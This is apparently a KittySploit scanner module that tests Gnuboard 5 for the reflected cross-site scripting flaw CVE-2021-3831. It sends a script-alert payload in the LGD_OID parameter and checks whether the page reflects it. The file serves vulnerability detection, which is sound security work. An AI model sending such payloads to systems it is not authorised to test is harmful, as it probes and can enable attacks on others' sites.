#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Gnuboard 5 contains a cross-site scripting vulnerability via the $_GET['LGD_OID'] parameter."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Gnuboard 5 - Cross-Site Scripting Detection',
        'description': "Gnuboard 5 contains a cross-site scripting vulnerability via the $_GET['LGD_OID'] parameter.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'gnuboard', 'xss', 'huntr', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.dev/bounties/ed317cde-9bd1-429e-b6d3-547e72534dd5/',
            'https://vulners.com/huntr/25775287-88CD-4F00-B978-692D627DFF04',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-3831',
        ],
        'cve': 'CVE-2021-3831',
    }

    def run(self):
        r = self.http_request(method="GET", path='/mobile/shop/lg/mispwapurl.php?LGD_OID=%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('LGD_OID = <script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Gnuboard 5 - Cross-Site Scripting detected",
                path='/mobile/shop/lg/mispwapurl.php?LGD_OID=%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

